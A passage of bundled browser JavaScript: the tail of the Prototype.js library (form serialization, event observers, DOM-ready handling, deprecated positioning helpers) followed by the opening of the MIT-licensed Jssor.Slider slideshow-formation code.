      return /^(?:input|select|textarea)$/i.test(element.tagName);
    });
  },

  focusFirstElement: function(form) {
    form = $(form);
    var element = form.findFirstElement();
    if (element) element.activate();
    return form;
  },

  request: function(form, options) {
    form = $(form), options = Object.clone(options || { });

    var params = options.parameters, action = form.readAttribute('action') || '';
    if (action.blank()) action = window.location.href;
    options.parameters = form.serialize(true);

    if (params) {
      if (Object.isString(params)) params = params.toQueryParams();
      Object.extend(options.parameters, params);
    }

    if (form.hasAttribute('method') && !options.method)
      options.method = form.method;

    return new Ajax.Request(action, options);
  }
};

/*--------------------------------------------------------------------------*/


Form.Element = {
  focus: function(element) {
    $(element).focus();
    return element;
  },

  select: function(element) {
    $(element).select();
    return element;
  }
};

Form.Element.Methods = {

  serialize: function(element) {
    element = $(element);
    if (!element.disabled && element.name) {
      var value = element.getValue();
      if (value != undefined) {
        var pair = { };
        pair[element.name] = value;
        return Object.toQueryString(pair);
      }
    }
    return '';
  },

  getValue: function(element) {
    element = $(element);
    var method = element.tagName.toLowerCase();
    return Form.Element.Serializers[method](element);
  },

  setValue: function(element, value) {
    element = $(element);
    var method = element.tagName.toLowerCase();
    Form.Element.Serializers[method](element, value);
    return element;
  },

  clear: function(element) {
    $(element).value = '';
    return element;
  },

  present: function(element) {
    return $(element).value != '';
  },

  activate: function(element) {
    element = $(element);
    try {
      element.focus();
      if (element.select && (element.tagName.toLowerCase() != 'input' ||
          !(/^(?:button|reset|submit)$/i.test(element.type))))
        element.select();
    } catch (e) { }
    return element;
  },

  disable: function(element) {
    element = $(element);
    element.disabled = true;
    return element;
  },

  enable: function(element) {
    element = $(element);
    element.disabled = false;
    return element;
  }
};

/*--------------------------------------------------------------------------*/

var Field = Form.Element;

var $F = Form.Element.Methods.getValue;

/*--------------------------------------------------------------------------*/

Form.Element.Serializers = (function() {
  function input(element, value) {
    switch (element.type.toLowerCase()) {
      case 'checkbox':
      case 'radio':
        return inputSelector(element, value);
      default:
        return valueSelector(element, value);
    }
  }

  function inputSelector(element, value) {
    if (Object.isUndefined(value))
      return element.checked ? element.value : null;
    else element.checked = !!value;
  }

  function valueSelector(element, value) {
    if (Object.isUndefined(value)) return element.value;
    else element.value = value;
  }

  function select(element, value) {
    if (Object.isUndefined(value))
      return (element.type === 'select-one' ? selectOne : selectMany)(element);

    var opt, currentValue, single = !Object.isArray(value);
    for (var i = 0, length = element.length; i < length; i++) {
      opt = element.options[i];
      currentValue = this.optionValue(opt);
      if (single) {
        if (currentValue == value) {
          opt.selected = true;
          return;
        }
      }
      else opt.selected = value.include(currentValue);
    }
  }

  function selectOne(element) {
    var index = element.selectedIndex;
    return index >= 0 ? optionValue(element.options[index]) : null;
  }

  function selectMany(element) {
    var values, length = element.length;
    if (!length) return null;

    for (var i = 0, values = []; i < length; i++) {
      var opt = element.options[i];
      if (opt.selected) values.push(optionValue(opt));
    }
    return values;
  }

  function optionValue(opt) {
    return Element.hasAttribute(opt, 'value') ? opt.value : opt.text;
  }

  return {
    input:         input,
    inputSelector: inputSelector,
    textarea:      valueSelector,
    select:        select,
    selectOne:     selectOne,
    selectMany:    selectMany,
    optionValue:   optionValue,
    button:        valueSelector
  };
})();

/*--------------------------------------------------------------------------*/


Abstract.TimedObserver = Class.create(PeriodicalExecuter, {
  initialize: function($super, element, frequency, callback) {
    $super(callback, frequency);
    this.element   = $(element);
    this.lastValue = this.getValue();
  },

  execute: function() {
    var value = this.getValue();
    if (Object.isString(this.lastValue) && Object.isString(value) ?
        this.lastValue != value : String(this.lastValue) != String(value)) {
      this.callback(this.element, value);
      this.lastValue = value;
    }
  }
});

Form.Element.Observer = Class.create(Abstract.TimedObserver, {
  getValue: function() {
    return Form.Element.getValue(this.element);
  }
});

Form.Observer = Class.create(Abstract.TimedObserver, {
  getValue: function() {
    return Form.serialize(this.element);
  }
});

/*--------------------------------------------------------------------------*/

Abstract.EventObserver = Class.create({
  initialize: function(element, callback) {
    this.element  = $(element);
    this.callback = callback;

    this.lastValue = this.getValue();
    if (this.element.tagName.toLowerCase() == 'form')
      this.registerFormCallbacks();
    else
      this.registerCallback(this.element);
  },

  onElementEvent: function() {
    var value = this.getValue();
    if (this.lastValue != value) {
      this.callback(this.element, value);
      this.lastValue = value;
    }
  },

  registerFormCallbacks: function() {
    Form.getElements(this.element).each(this.registerCallback, this);
  },

  registerCallback: function(element) {
    if (element.type) {
      switch (element.type.toLowerCase()) {
        case 'checkbox':
        case 'radio':
          Event.observe(element, 'click', this.onElementEvent.bind(this));
          break;
        default:
          Event.observe(element, 'change', this.onElementEvent.bind(this));
          break;
      }
    }
  }
});

Form.Element.EventObserver = Class.create(Abstract.EventObserver, {
  getValue: function() {
    return Form.Element.getValue(this.element);
  }
});

Form.EventObserver = Class.create(Abstract.EventObserver, {
  getValue: function() {
    return Form.serialize(this.element);
  }
});
(function() {

  var Event = {
    KEY_BACKSPACE: 8,
    KEY_TAB:       9,
    KEY_RETURN:   13,
    KEY_ESC:      27,
    KEY_LEFT:     37,
    KEY_UP:       38,
    KEY_RIGHT:    39,
    KEY_DOWN:     40,
    KEY_DELETE:   46,
    KEY_HOME:     36,
    KEY_END:      35,
    KEY_PAGEUP:   33,
    KEY_PAGEDOWN: 34,
    KEY_INSERT:   45,

    cache: {}
  };

  var docEl = document.documentElement;
  var MOUSEENTER_MOUSELEAVE_EVENTS_SUPPORTED = 'onmouseenter' in docEl
    && 'onmouseleave' in docEl;



  var isIELegacyEvent = function(event) { return false; };

  if (window.attachEvent) {
    if (window.addEventListener) {
      isIELegacyEvent = function(event) {
        return !(event instanceof window.Event);
      };
    } else {
      isIELegacyEvent = function(event) { return true; };
    }
  }

  var _isButton;

  function _isButtonForDOMEvents(event, code) {
    return event.which ? (event.which === code + 1) : (event.button === code);
  }

  var legacyButtonMap = { 0: 1, 1: 4, 2: 2 };
  function _isButtonForLegacyEvents(event, code) {
    return event.button === legacyButtonMap[code];
  }

  function _isButtonForWebKit(event, code) {
    switch (code) {
      case 0: return event.which == 1 && !event.metaKey;
      case 1: return event.which == 2 || (event.which == 1 && event.metaKey);
      case 2: return event.which == 3;
      default: return false;
    }
  }

  if (window.attachEvent) {
    if (!window.addEventListener) {
      _isButton = _isButtonForLegacyEvents;
    } else {
      _isButton = function(event, code) {
        return isIELegacyEvent(event) ? _isButtonForLegacyEvents(event, code) :
         _isButtonForDOMEvents(event, code);
      }
    }
  } else if (Prototype.Browser.WebKit) {
    _isButton = _isButtonForWebKit;
  } else {
    _isButton = _isButtonForDOMEvents;
  }

  function isLeftClick(event)   { return _isButton(event, 0) }

  function isMiddleClick(event) { return _isButton(event, 1) }

  function isRightClick(event)  { return _isButton(event, 2) }

  function element(event) {
    event = Event.extend(event);

    var node = event.target, type = event.type,
     currentTarget = event.currentTarget;

    if (currentTarget && currentTarget.tagName) {
      if (type === 'load' || type === 'error' ||
        (type === 'click' && currentTarget.tagName.toLowerCase() === 'input'
          && currentTarget.type === 'radio'))
            node = currentTarget;
    }

    if (node.nodeType == Node.TEXT_NODE)
      node = node.parentNode;

    return Element.extend(node);
  }

  function findElement(event, expression) {
    var element = Event.element(event);

    if (!expression) return element;
    while (element) {
      if (Object.isElement(element) && Prototype.Selector.match(element, expression)) {
        return Element.extend(element);
      }
      element = element.parentNode;
    }
  }

  function pointer(event) {
    return { x: pointerX(event), y: pointerY(event) };
  }

  function pointerX(event) {
    var docElement = document.documentElement,
     body = document.body || { scrollLeft: 0 };

    return event.pageX || (event.clientX +
      (docElement.scrollLeft || body.scrollLeft) -
      (docElement.clientLeft || 0));
  }

  function pointerY(event) {
    var docElement = document.documentElement,
     body = document.body || { scrollTop: 0 };

    return  event.pageY || (event.clientY +
       (docElement.scrollTop || body.scrollTop) -
       (docElement.clientTop || 0));
  }


  function stop(event) {
    Event.extend(event);
    event.preventDefault();
    event.stopPropagation();

    event.stopped = true;
  }


  Event.Methods = {
    isLeftClick:   isLeftClick,
    isMiddleClick: isMiddleClick,
    isRightClick:  isRightClick,

    element:     element,
    findElement: findElement,

    pointer:  pointer,
    pointerX: pointerX,
    pointerY: pointerY,

    stop: stop
  };

  var methods = Object.keys(Event.Methods).inject({ }, function(m, name) {
    m[name] = Event.Methods[name].methodize();
    return m;
  });

  if (window.attachEvent) {
    function _relatedTarget(event) {
      var element;
      switch (event.type) {
        case 'mouseover':
        case 'mouseenter':
          element = event.fromElement;
          break;
        case 'mouseout':
        case 'mouseleave':
          element = event.toElement;
          break;
        default:
          return null;
      }
      return Element.extend(element);
    }

    var additionalMethods = {
      stopPropagation: function() { this.cancelBubble = true },
      preventDefault:  function() { this.returnValue = false },
      inspect: function() { return '[object Event]' }
    };

    Event.extend = function(event, element) {
      if (!event) return false;

      if (!isIELegacyEvent(event)) return event;

      if (event._extendedByPrototype) return event;
      event._extendedByPrototype = Prototype.emptyFunction;

      var pointer = Event.pointer(event);

      Object.extend(event, {
        target: event.srcElement || element,
        relatedTarget: _relatedTarget(event),
        pageX:  pointer.x,
        pageY:  pointer.y
      });

      Object.extend(event, methods);
      Object.extend(event, additionalMethods);

      return event;
    };
  } else {
    Event.extend = Prototype.K;
  }

  if (window.addEventListener) {
    Event.prototype = window.Event.prototype || document.createEvent('HTMLEvents').__proto__;
    Object.extend(Event.prototype, methods);
  }

  function _createResponder(element, eventName, handler) {
    var registry = Element.retrieve(element, 'prototype_event_registry');

    if (Object.isUndefined(registry)) {
      CACHE.push(element);
      registry = Element.retrieve(element, 'prototype_event_registry', $H());
    }

    var respondersForEvent = registry.get(eventName);
    if (Object.isUndefined(respondersForEvent)) {
      respondersForEvent = [];
      registry.set(eventName, respondersForEvent);
    }

    if (respondersForEvent.pluck('handler').include(handler)) return false;

    var responder;
    if (eventName.include(":")) {
      responder = function(event) {
        if (Object.isUndefined(event.eventName))
          return false;

        if (event.eventName !== eventName)
          return false;

        Event.extend(event, element);
        handler.call(element, event);
      };
    } else {
      if (!MOUSEENTER_MOUSELEAVE_EVENTS_SUPPORTED &&
       (eventName === "mouseenter" || eventName === "mouseleave")) {
        if (eventName === "mouseenter" || eventName === "mouseleave") {
          responder = function(event) {
            Event.extend(event, element);

            var parent = event.relatedTarget;
            while (parent && parent !== element) {
              try { parent = parent.parentNode; }
              catch(e) { parent = element; }
            }

            if (parent === element) return;

            handler.call(element, event);
          };
        }
      } else {
        responder = function(event) {
          Event.extend(event, element);
          handler.call(element, event);
        };
      }
    }

    responder.handler = handler;
    respondersForEvent.push(responder);
    return responder;
  }

  function _destroyCache() {
    for (var i = 0, length = CACHE.length; i < length; i++) {
      Event.stopObserving(CACHE[i]);
      CACHE[i] = null;
    }
  }

  var CACHE = [];

  if (Prototype.Browser.IE)
    window.attachEvent('onunload', _destroyCache);

  if (Prototype.Browser.WebKit)
    window.addEventListener('unload', Prototype.emptyFunction, false);


  var _getDOMEventName = Prototype.K,
      translations = { mouseenter: "mouseover", mouseleave: "mouseout" };

  if (!MOUSEENTER_MOUSELEAVE_EVENTS_SUPPORTED) {
    _getDOMEventName = function(eventName) {
      return (translations[eventName] || eventName);
    };
  }

  function observe(element, eventName, handler) {
    element = $(element);

    var responder = _createResponder(element, eventName, handler);

    if (!responder) return element;

    if (eventName.include(':')) {
      if (element.addEventListener)
        element.addEventListener("dataavailable", responder, false);
      else {
        element.attachEvent("ondataavailable", responder);
        element.attachEvent("onlosecapture", responder);
      }
    } else {
      var actualEventName = _getDOMEventName(eventName);

      if (element.addEventListener)
        element.addEventListener(actualEventName, responder, false);
      else
        element.attachEvent("on" + actualEventName, responder);
    }

    return element;
  }

  function stopObserving(element, eventName, handler) {
    element = $(element);

    var registry = Element.retrieve(element, 'prototype_event_registry');
    if (!registry) return element;

    if (!eventName) {
      registry.each( function(pair) {
        var eventName = pair.key;
        stopObserving(element, eventName);
      });
      return element;
    }

    var responders = registry.get(eventName);
    if (!responders) return element;

    if (!handler) {
      responders.each(function(r) {
        stopObserving(element, eventName, r.handler);
      });
      return element;
    }

    var i = responders.length, responder;
    while (i--) {
      if (responders[i].handler === handler) {
        responder = responders[i];
        break;
      }
    }
    if (!responder) return element;

    if (eventName.include(':')) {
      if (element.removeEventListener)
        element.removeEventListener("dataavailable", responder, false);
      else {
        element.detachEvent("ondataavailable", responder);
        element.detachEvent("onlosecapture", responder);
      }
    } else {
      var actualEventName = _getDOMEventName(eventName);
      if (element.removeEventListener)
        element.removeEventListener(actualEventName, responder, false);
      else
        element.detachEvent('on' + actualEventName, responder);
    }

    registry.set(eventName, responders.without(responder));

    return element;
  }

  function fire(element, eventName, memo, bubble) {
    element = $(element);

    if (Object.isUndefined(bubble))
      bubble = true;

    if (element == document && document.createEvent && !element.dispatchEvent)
      element = document.documentElement;

    var event;
    if (document.createEvent) {
      event = document.createEvent('HTMLEvents');
      event.initEvent('dataavailable', bubble, true);
    } else {
      event = document.createEventObject();
      event.eventType = bubble ? 'ondataavailable' : 'onlosecapture';
    }

    event.eventName = eventName;
    event.memo = memo || { };

    if (document.createEvent)
      element.dispatchEvent(event);
    else
      element.fireEvent(event.eventType, event);

    return Event.extend(event);
  }

  Event.Handler = Class.create({
    initialize: function(element, eventName, selector, callback) {
      this.element   = $(element);
      this.eventName = eventName;
      this.selector  = selector;
      this.callback  = callback;
      this.handler   = this.handleEvent.bind(this);
    },

    start: function() {
      Event.observe(this.element, this.eventName, this.handler);
      return this;
    },

    stop: function() {
      Event.stopObserving(this.element, this.eventName, this.handler);
      return this;
    },

    handleEvent: function(event) {
      var element = Event.findElement(event, this.selector);
      if (element) this.callback.call(this.element, event, element);
    }
  });

  function on(element, eventName, selector, callback) {
    element = $(element);
    if (Object.isFunction(selector) && Object.isUndefined(callback)) {
      callback = selector, selector = null;
    }

    return new Event.Handler(element, eventName, selector, callback).start();
  }

  Object.extend(Event, Event.Methods);

  Object.extend(Event, {
    fire:          fire,
    observe:       observe,
    stopObserving: stopObserving,
    on:            on
  });

  Element.addMethods({
    fire:          fire,

    observe:       observe,

    stopObserving: stopObserving,

    on:            on
  });

  Object.extend(document, {
    fire:          fire.methodize(),

    observe:       observe.methodize(),

    stopObserving: stopObserving.methodize(),

    on:            on.methodize(),

    loaded:        false
  });

  if (window.Event) Object.extend(window.Event, Event);
  else window.Event = Event;
})();

(function() {
  /* Support for the DOMContentLoaded event is based on work by Dan Webb,
     Matthias Miller, Dean Edwards, John Resig, and Diego Perini. */

  var timer;

  function fireContentLoadedEvent() {
    if (document.loaded) return;
    if (timer) window.clearTimeout(timer);
    document.loaded = true;
    document.fire('dom:loaded');
  }

  function checkReadyState() {
    if (document.readyState === 'complete') {
      document.stopObserving('readystatechange', checkReadyState);
      fireContentLoadedEvent();
    }
  }

  function pollDoScroll() {
    try { document.documentElement.doScroll('left'); }
    catch(e) {
      timer = pollDoScroll.defer();
      return;
    }
    fireContentLoadedEvent();
  }

  if (document.addEventListener) {
    document.addEventListener('DOMContentLoaded', fireContentLoadedEvent, false);
  } else {
    document.observe('readystatechange', checkReadyState);
    if (window == top)
      timer = pollDoScroll.defer();
  }

  Event.observe(window, 'load', fireContentLoadedEvent);
})();

Element.addMethods();

/*------------------------------- DEPRECATED -------------------------------*/

Hash.toQueryString = Object.toQueryString;

var Toggle = { display: Element.toggle };

Element.Methods.childOf = Element.Methods.descendantOf;

var Insertion = {
  Before: function(element, content) {
    return Element.insert(element, {before:content});
  },

  Top: function(element, content) {
    return Element.insert(element, {top:content});
  },

  Bottom: function(element, content) {
    return Element.insert(element, {bottom:content});
  },

  After: function(element, content) {
    return Element.insert(element, {after:content});
  }
};

var $continue = new Error('"throw $continue" is deprecated, use "return" instead');

var Position = {
  includeScrollOffsets: false,

  prepare: function() {
    this.deltaX =  window.pageXOffset
                || document.documentElement.scrollLeft
                || document.body.scrollLeft
                || 0;
    this.deltaY =  window.pageYOffset
                || document.documentElement.scrollTop
                || document.body.scrollTop
                || 0;
  },

  within: function(element, x, y) {
    if (this.includeScrollOffsets)
      return this.withinIncludingScrolloffsets(element, x, y);
    this.xcomp = x;
    this.ycomp = y;
    this.offset = Element.cumulativeOffset(element);

    return (y >= this.offset[1] &&
            y <  this.offset[1] + element.offsetHeight &&
            x >= this.offset[0] &&
            x <  this.offset[0] + element.offsetWidth);
  },

  withinIncludingScrolloffsets: function(element, x, y) {
    var offsetcache = Element.cumulativeScrollOffset(element);

    this.xcomp = x + offsetcache[0] - this.deltaX;
    this.ycomp = y + offsetcache[1] - this.deltaY;
    this.offset = Element.cumulativeOffset(element);

    return (this.ycomp >= this.offset[1] &&
            this.ycomp <  this.offset[1] + element.offsetHeight &&
            this.xcomp >= this.offset[0] &&
            this.xcomp <  this.offset[0] + element.offsetWidth);
  },

  overlap: function(mode, element) {
    if (!mode) return 0;
    if (mode == 'vertical')
      return ((this.offset[1] + element.offsetHeight) - this.ycomp) /
        element.offsetHeight;
    if (mode == 'horizontal')
      return ((this.offset[0] + element.offsetWidth) - this.xcomp) /
        element.offsetWidth;
  },


  cumulativeOffset: Element.Methods.cumulativeOffset,

  positionedOffset: Element.Methods.positionedOffset,

  absolutize: function(element) {
    Position.prepare();
    return Element.absolutize(element);
  },

  relativize: function(element) {
    Position.prepare();
    return Element.relativize(element);
  },

  realOffset: Element.Methods.cumulativeScrollOffset,

  offsetParent: Element.Methods.getOffsetParent,

  page: Element.Methods.viewportOffset,

  clone: function(source, target, options) {
    options = options || { };
    return Element.clonePosition(target, source, options);
  }
};

/*--------------------------------------------------------------------------*/

if (!document.getElementsByClassName) document.getElementsByClassName = function(instanceMethods){
  function iter(name) {
    return name.blank() ? null : "[contains(concat(' ', @class, ' '), ' " + name + " ')]";
  }

  instanceMethods.getElementsByClassName = Prototype.BrowserFeatures.XPath ?
  function(element, className) {
    className = className.toString().strip();
    var cond = /\s/.test(className) ? $w(className).map(iter).join('') : iter(className);
    return cond ? document._getElementsByXPath('.//*' + cond, element) : [];
  } : function(element, className) {
    className = className.toString().strip();
    var elements = [], classNames = (/\s/.test(className) ? $w(className) : null);
    if (!classNames && !className) return elements;

    var nodes = $(element).getElementsByTagName('*');
    className = ' ' + className + ' ';

    for (var i = 0, child, cn; child = nodes[i]; i++) {
      if (child.className && (cn = ' ' + child.className + ' ') && (cn.include(className) ||
          (classNames && classNames.all(function(name) {
            return !name.toString().blank() && cn.include(' ' + name + ' ');
          }))))
        elements.push(Element.extend(child));
    }
    return elements;
  };

  return function(className, parentElement) {
    return $(parentElement || document.body).getElementsByClassName(className);
  };
}(Element.Methods);

/*--------------------------------------------------------------------------*/

Element.ClassNames = Class.create();
Element.ClassNames.prototype = {
  initialize: function(element) {
    this.element = $(element);
  },

  _each: function(iterator) {
    this.element.className.split(/\s+/).select(function(name) {
      return name.length > 0;
    })._each(iterator);
  },

  set: function(className) {
    this.element.className = className;
  },

  add: function(classNameToAdd) {
    if (this.include(classNameToAdd)) return;
    this.set($A(this).concat(classNameToAdd).join(' '));
  },

  remove: function(classNameToRemove) {
    if (!this.include(classNameToRemove)) return;
    this.set($A(this).without(classNameToRemove).join(' '));
  },

  toString: function() {
    return $A(this).join(' ');
  }
};

Object.extend(Element.ClassNames.prototype, Enumerable);

/*--------------------------------------------------------------------------*/

(function() {
  window.Selector = Class.create({
    initialize: function(expression) {
      this.expression = expression.strip();
    },

    findElements: function(rootElement) {
      return Prototype.Selector.select(this.expression, rootElement);
    },

    match: function(element) {
      return Prototype.Selector.match(element, this.expression);
    },

    toString: function() {
      return this.expression;
    },

    inspect: function() {
      return "#<Selector: " + this.expression + ">";
    }
  });

  Object.extend(Selector, {
    matchElements: function(elements, expression) {
      var match = Prototype.Selector.match,
          results = [];

      for (var i = 0, length = elements.length; i < length; i++) {
        var element = elements[i];
        if (match(element, expression)) {
          results.push(Element.extend(element));
        }
      }
      return results;
    },

    findElement: function(elements, expression, index) {
      index = index || 0;
      var matchIndex = 0, element;
      for (var i = 0, length = elements.length; i < length; i++) {
        element = elements[i];
        if (Prototype.Selector.match(element, expression) && index === matchIndex++) {
          return Element.extend(element);
        }
      }
    },

    findChildElements: function(element, expressions) {
      var selector = expressions.toArray().join(', ');
      return Prototype.Selector.select(selector, element || document);
    }
  });
})();

﻿/// <reference path="Jssor.js" />

/*
* Jssor.Slider 18.0
* http://www.jssor.com/
*
* Licensed under the MIT license:
* http://www.opensource.org/licenses/MIT
* 
* TERMS OF USE - Jssor.Slider
* 
* Copyright 2014 Jssor
*
* Permission is hereby granted, free of charge, to any person obtaining
* a copy of this software and associated documentation files (the
* "Software"), to deal in the Software without restriction, including
* without limitation the rights to use, copy, modify, merge, publish,
* distribute, sublicense, and/or sell copies of the Software, and to
* permit persons to whom the Software is furnished to do so, subject to
* the following conditions:
* 
* The above copyright notice and this permission notice shall be
* included in all copies or substantial portions of the Software.
* 
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
* EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
* MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
* NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE
* LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
* OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
* WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/

var $JssorSlider$;
var $JssorSlideshowFormations$ = window.$JssorSlideshowFormations$ = {};
var $JssorSlideshowRunner$;

new function () {
    //Constants +++++++

    var COLUMN_INCREASE = 0;
    var COLUMN_DECREASE = 1;
    var ROW_INCREASE = 2;
    var ROW_DECREASE = 3;

    var DIRECTION_HORIZONTAL = 0x0003;
    var DIRECTION_VERTICAL = 0x000C;

    var TO_LEFT = 0x0001;
    var TO_RIGHT = 0x0002;
    var TO_TOP = 0x0004;
    var TO_BOTTOM = 0x0008;

    var FROM_LEFT = 0x0100;
    var FROM_TOP = 0x0200;
    var FROM_RIGHT = 0x0400;
    var FROM_BOTTOM = 0x0800;

    var ASSEMBLY_BOTTOM_LEFT = FROM_BOTTOM + TO_LEFT;
    var ASSEMBLY_BOTTOM_RIGHT = FROM_BOTTOM + TO_RIGHT;
    var ASSEMBLY_TOP_LEFT = FROM_TOP + TO_LEFT;
    var ASSEMBLY_TOP_RIGHT = FROM_TOP + TO_RIGHT;
    var ASSEMBLY_LEFT_TOP = FROM_LEFT + TO_TOP;
    var ASSEMBLY_LEFT_BOTTOM = FROM_LEFT + TO_BOTTOM;
    var ASSEMBLY_RIGHT_TOP = FROM_RIGHT + TO_TOP;
    var ASSEMBLY_RIGHT_BOTTOM = FROM_RIGHT + TO_BOTTOM;

    //Constants -------

    //Formation Definition +++++++
    function isToLeft(roadValue) {
        return (roadValue & TO_LEFT) == TO_LEFT;
    }

    function isToRight(roadValue) {
        return (roadValue & TO_RIGHT) == TO_RIGHT;
    }

    function isToTop(roadValue) {
        return (roadValue & TO_TOP) == TO_TOP;
    }

    function isToBottom(roadValue) {
        return (roadValue & TO_BOTTOM) == TO_BOTTOM;
    }

    function PushFormationOrder(arr, order, formationItem) {
        formationItem.push(order);
        arr[order] = arr[order] || [];
        arr[order].push(formationItem);
    }

    $JssorSlideshowFormations$.$FormationStraight = function (transition) {
        var cols = transition.$Cols;
        var rows = transition.$Rows;
        var formationDirection = transition.$Assembly;
        var count = transition.$Count;
        var a = [];
        var i = 0;
        var col = 0;
        var r = 0;
        var cl = cols - 1;
        var rl = rows - 1;
        var il = count - 1;
        var cr;
        var order;
        for (r = 0; r < rows; r++) {
            for (col = 0; col < cols; col++) {
                cr = r + ',' + col;
                switch (formationDirection) {
                    case ASSEMBLY_BOTTOM_LEFT:
                        order = il - (col * rows + (rl - r));
                        break;
                    case ASSEMBLY_RIGHT_TOP:
                        order = il - (r * cols + (cl - col));
                        break;
                    case ASSEMBLY_TOP_LEFT:
                        order = il - (col * rows + r);
                    case ASSEMBLY_LEFT_TOP:
                        order = il - (r * cols + col);
                        break;
                    case ASSEMBLY_BOTTOM_RIGHT:
                        order = col * rows + r;
                        break;
                    case ASSEMBLY_LEFT_BOTTOM:
                        order = r * cols + (cl - col);
                        break;
                    case ASSEMBLY_TOP_RIGHT:
                        order = col * rows + (rl - r);
                        break;
                    default:
                        order = r * cols + col;
                        break; //ASSEMBLY_RIGHT_BOTTOM
                }
                PushFormationOrder(a, order, [r, col]);
            }
        }

        return a;
    };

    $JssorSlideshowFormations$.$FormationSwirl = function (transition) {
        var cols = transition.$Cols;
        var rows = transition.$Rows;
        var formationDirection = transition.$Assembly;
        var count = transition.$Count;
        var a = [];
        var hit = [];
        var i = 0;
        var col = 0;
        var r = 0;
        var cl = cols - 1;
        var rl = rows - 1;
        var il = count - 1;
        var cr;
        var courses;
        var course = 0;
        switch (formationDirection) {
            case ASSEMBLY_BOTTOM_LEFT:
                col = cl;
                r = 0;
                courses = [ROW_INCREASE, COLUMN_DECREASE, ROW_DECREASE, COLUMN_INCREASE];
                break;
            case ASSEMBLY_RIGHT_TOP:
                col = 0;
                r = rl;
                courses = [COLUMN_INCREASE, ROW_DECREASE, COLUMN_DECREASE, ROW_INCREASE];
                break;
            case ASSEMBLY_TOP_LEFT:
                col = cl;
                r = rl;
                courses = [ROW_DECREASE, COLUMN_DECREASE, ROW_INCREASE, COLUMN_INCREASE];
                break;
            case ASSEMBLY_LEFT_TOP:
                col = cl;
                r = rl;
                courses = [COLUMN_DECREASE, ROW_DECREASE, COLUMN_INCREASE, ROW_INCREASE];
                break;
            case ASSEMBLY_BOTTOM_RIGHT:
                col = 0;
                r = 0;
                courses = [ROW_INCREASE, COLUMN_INCREASE, ROW_DECREASE, COLUMN_DECREASE];
                break;
            case ASSEMBLY_LEFT_BOTTOM:
                col = cl;
                r = 0;
                courses = [COLUMN_DECREASE, ROW_INCREASE, COLUMN_INCREASE, ROW_DECREASE];
                break;
            case ASSEMBLY_TOP_RIGHT:
                col = 0;
                r = rl;
                courses = [ROW_DECREASE, COLUMN_INCREASE, ROW_INCREASE, COLUMN_DECREASE];
                break;
            default:
                col = 0;
                r = 0;
                courses = [COLUMN_INCREASE, ROW_INCREASE, COLUMN_DECREASE, ROW_DECREASE];
                break; //ASSEMBLY_RIGHT_BOTTOM
        }
        i = 0;
        while (i < count) {
            cr = r + ',' + col;
            if (col >= 0 && col < cols && r >= 0 && r < rows && !hit[cr]) {
                //a[cr] = i++;
                hit[cr] = true;
                PushFormationOrder(a, i++, [r, col]);
            }
            else {
                switch (courses[course++ % courses.length]) {
                    case COLUMN_INCREASE:
                        col--;
                        break;
                    case ROW_INCREASE:
                        r--;
                        break;
                    case COLUMN_DECREASE:
                        col++;
                        break;
                    case ROW_DECREASE:
                        r++;
                        break;
                }
            }

            switch (courses[course % courses.length]) {
                case COLUMN_INCREASE:
                    col++;
                    break;
                case ROW_INCREASE:
                    r++;
                    break;
                case COLUMN_DECREASE:
                    col--;
                    break;
                case ROW_DECREASE:
                    r--;
                    break;
            }
        }
        return a;
    };

    $JssorSlideshowFormations$.$FormationZigZag = function (transition) {
        var cols = transition.$Cols;
        var rows = transition.$Rows;
        var formationDirection = transition.$Assembly;
        var count = transition.$Count;
        var a = [];
        var i = 0;
        var col = 0;
        var r = 0;
        var cl = cols - 1;
        var rl = rows - 1;
        var il = count - 1;
        var cr;
        var courses;
        var course = 0;
        switch (formationDirection) {
            case ASSEMBLY_BOTTOM_LEFT:
                col = cl;
                r = 0;
                courses = [ROW_INCREASE, COLUMN_DECREASE, ROW_DECREASE, COLUMN_DECREASE];
                break;
            case ASSEMBLY_RIGHT_TOP:
                col = 0;
                r = rl;
                courses = [COLUMN_INCREASE, ROW_DECREASE, COLUMN_DECREASE, ROW_DECREASE];
                break;
            case ASSEMBLY_TOP_LEFT:
                col = cl;
                r = rl;
                courses = [ROW_DECREASE, COLUMN_DECREASE, ROW_INCREASE, COLUMN_DECREASE];
                break;
            case ASSEMBLY_LEFT_TOP:
                col = cl;
                r = rl;
                courses = [COLUMN_DECREASE, ROW_DECREASE, COLUMN_INCREASE, ROW_DECREASE];
                break;
            case ASSEMBLY_BOTTOM_RIGHT:
                col = 0;
                r = 0;
                courses = [ROW_INCREASE, COLUMN_INCREASE, ROW_DECREASE, COLUMN_INCREASE];
                break;
            case ASSEMBLY_LEFT_BOTTOM:
                col = cl;
                r = 0;
                courses = [COLUMN_DECREASE, ROW_INCREASE, COLUMN_INCREASE, ROW_INCREASE];
                break;
            case ASSEMBLY_TOP_RIGHT:
                col = 0;
                r = rl;
                courses = [ROW_DECREASE, COLUMN_INCREASE, ROW_INCREASE, COLUMN_INCREASE];
                break;
            default:
                col = 0;
                r = 0;
                courses = [COLUMN_INCREASE, ROW_INCREASE, COLUMN_DECREASE, ROW_INCREASE];
                break; //ASSEMBLY_RIGHT_BOTTOM
        }
        i = 0;
        while (i < count) {
            cr = r + ',' + col;
            if (col >= 0 && col < cols && r >= 0 && r < rows && typeof (a[cr]) == 'undefined') {
                PushFormationOrder(a, i++, [r, col]);
                //a[cr] = i++;
                switch (courses[course % courses.length]) {
                    case COLUMN_INCREASE:
                        col++;
                        break;
                    case ROW_INCREASE:
                        r++;
                        break;
                    case COLUMN_DECREASE:
                        col--;
                        break;
                    case ROW_DECREASE:
                        r--;
                        break;
                }
            }
            else {
                switch (courses[course++ % courses.length]) {
                    case COLUMN_INCREASE:
                        col--;
                        break;
                    case ROW_INCREASE:
                        r--;
                        break;
                    case COLUMN_DECREASE:
                        col++;
                        break;
                    case ROW_DECREASE:
                        r++;
                        break;
                }
                switch (courses[course++ % courses.length]) {
                    case COLUMN_INCREASE:
                        col++;
                        break;
                    case ROW_INCREASE:
                        r++;
                        break;
                    case COLUMN_DECREASE:
                        col--;
